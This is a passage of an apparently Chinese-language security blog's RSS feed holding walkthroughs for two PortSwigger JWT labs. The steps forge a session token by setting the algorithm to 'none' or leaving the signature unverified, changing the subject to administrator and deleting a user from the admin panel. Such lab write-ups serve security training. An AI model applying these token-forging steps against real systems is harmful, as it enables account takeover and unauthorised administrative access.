&lt;p>&lt;img alt="Lab description" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上角&lt;code>My account&lt;/code>并使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
&lt;li>登录后跳转至个人页面，请求如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /my-account?id=wiener &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiI5ZDgzYzk5ZC03MDQyLTQxOTYtYTY0Ny1mZWE5MjUzNmY5NjQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTIzMDYyOCwic3ViIjoid2llbmVyIn0.WDgCWkjhNJTKUUWQXtSWZeNvucgq3tI2jolposyLR_6Wb1oalFTHet06RriaBSNRg9L_ymsEKBLggXXHuMiTxYSGIS6WkKbEPuu7RvwXQOvWG2lLOrtB5nGF50qBY1Byw7OLEyzDsij1mkLcHhy8b5limYlHOprtOnlX8J8zST2G1aG6esITtWEuJjHPaNrCnOHgVSaFzr4RpW0fd1P6kGzin47G71MqsCwOueH7DHn2_ySnX0Wkw_Ehwkd_EMjcAmT-l-ecD3jsFBaaIOna0HtLntFf7eRT3CdXLEHmwkTmewAjrHTgV8e1CcpiAXcEFdQuXxU4pYF0yBXvwIpDeg&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>将&lt;code>JWT header&lt;/code>中的&lt;code>alg&lt;/code>从&lt;code>RS256&lt;/code>修改为&lt;code>none&lt;/code>并点击&lt;code>Apply changes&lt;/code>
&lt;img alt="Edit jwt header" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification-2.jpg">
&lt;img alt="Edit jwt header" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification-3.jpg">&lt;/li>
&lt;li>将&lt;code>JWT payload&lt;/code>中的&lt;code>sub&lt;/code>从&lt;code>wiener&lt;/code>修改为&lt;code>administrator&lt;/code>并点击&lt;code>Apply changes&lt;/code>
&lt;img alt="Edit jwt payload" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification-4.jpg">
&lt;img alt="Edit jwt payload" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification-5.jpg">&lt;/li>
&lt;li>将&lt;code>JWT signature&lt;/code>删除
&lt;img alt="Edit jwt signature" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification-6.jpg">
&lt;img alt="Edit jwt signature" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification-7.jpg">&lt;/li>
&lt;li>将url修改为&lt;code>/admin&lt;/code>，在浏览器开启请求即可看见&lt;code>Admin panel&lt;/code>&lt;/li>
&lt;li>将上述url修改为&lt;code>/admin/delete?username=carlos&lt;/code>并再次在浏览器开启请求即可解题&lt;/li>
&lt;/ol></content></item><item><title>Lab: JWT authentication bypass via unverified signature</title><link>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-unverified-signature/</link><pubDate>Thu, 26 Dec 2024 22:31:15 +0800</pubDate><guid>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-unverified-signature/</guid><description>Lab description Solution 点击右上角My account并使用wiener:peter登录 登录后跳转至个人页面，请求如下 GET /my-account?id=wiener HTTP/2 Cookie: session=eyJraWQiOiJkZTk5MWIwNi05ZWMzLTQ4MmQtYjJiZi04ZGM0MzJhNzJkNDkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTIyOTM3Miwic3ViIjoid2llbmVyIn0.E1lgjh_mRmyY7KohOUDUurkhpfrir7yqJv6GvOVUuj1ZWK2ZsuJyKf5E2yWvbGdtz2w9b6-w5zVnsSxKOJUh8uLyn5erVbA4GZJoG9SN18Py8zYAVJf45pJA8qYEHQ2-VMRq2mStg_q5tN7hThr-iIcWhqfWqwuJ52c5Q0RXMUU6Uhd894QYkOIa5cewvBpkVWHFigf0OI3rzYF-GcmyonamnYz9fVmLx9UAJ0paYpDE19quvH0NwGrWRlEdvyNlXKy4d-jIxx0SuKnIMoP35NbhT2PDiDyp6F15HyQj-ZvVfp1Ry--uoUJ1vRkK1Xu66_JoDtqfj0_bGyuzl_CgLw 将JWT payload中的sub从wiener修改为administrator并点击Apply changes，同时修改url为/admin 在浏览器开启请求即可看见Admin panel，将上述url修改为/admin/delete?username=carlos并再次在浏览器开启请求即可解题</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-unverified-signature-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上角&lt;code>My account&lt;/code>并使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
&lt;li>登录后跳转至个人页面，请求如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /my-account?id=wiener &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiJkZTk5MWIwNi05ZWMzLTQ4MmQtYjJiZi04ZGM0MzJhNzJkNDkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTIyOTM3Miwic3ViIjoid2llbmVyIn0.E1lgjh_mRmyY7KohOUDUurkhpfrir7yqJv6GvOVUuj1ZWK2ZsuJyKf5E2yWvbGdtz2w9b6-w5zVnsSxKOJUh8uLyn5erVbA4GZJoG9SN18Py8zYAVJf45pJA8qYEHQ2-VMRq2mStg_q5tN7hThr-iIcWhqfWqwuJ52c5Q0RXMUU6Uhd894QYkOIa5cewvBpkVWHFigf0OI3rzYF-GcmyonamnYz9fVmLx9UAJ0paYpDE19quvH0NwGrWRlEdvyNlXKy4d-jIxx0SuKnIMoP35NbhT2PDiDyp6F15HyQj-ZvVfp1Ry--uoUJ1vRkK1Xu66_JoDtqfj0_bGyuzl_CgLw&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>将&lt;code>JWT payload&lt;/code>中的&lt;code>sub&lt;/code>从&lt;code>wiener&lt;/code>修改为&lt;code>administrator&lt;/code>并点击&lt;code>Apply changes&lt;/code>，同时修改url为&lt;code>/admin&lt;/code>
&lt;img alt="Edit jwt" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-unverified-signature-2.jpg">
&lt;img alt="Edit jwt" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-unverified-signature-3.jpg">&lt;/li>
&lt;li>在浏览器开启请求即可看见&lt;code>Admin panel&lt;/code>，将上述url修改为&lt;code>/admin/delete?username=carlos&lt;/code>并再次在浏览器开启请求即可解题&lt;/li>
&lt;/ol></content></item></channel></rss>